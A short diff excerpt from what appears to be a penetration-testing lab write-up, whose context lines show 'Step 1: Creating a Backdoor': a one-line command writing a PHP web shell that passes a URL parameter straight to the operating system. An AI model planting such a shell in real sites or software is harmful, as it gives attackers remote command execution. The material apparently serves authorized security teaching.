@@ -31,7 +31,7 @@ controlled environment or on authorized targets.
 
 **Step-by-Step Execution:**  
 
-**Step 1: Creating a Backdoor**
+**Step 1: Creating a Backdoor**  
 (insert ss)  
 **Command:** `echo "<?php system(\$_GET['cmd']); ?>" > simple_shell.php`    
 **Reason of command:** This writes a tiny PHP script that takes whatever text is placed in the `cmd` URL parameter and passes it directly to the underlying Linux operating system.  
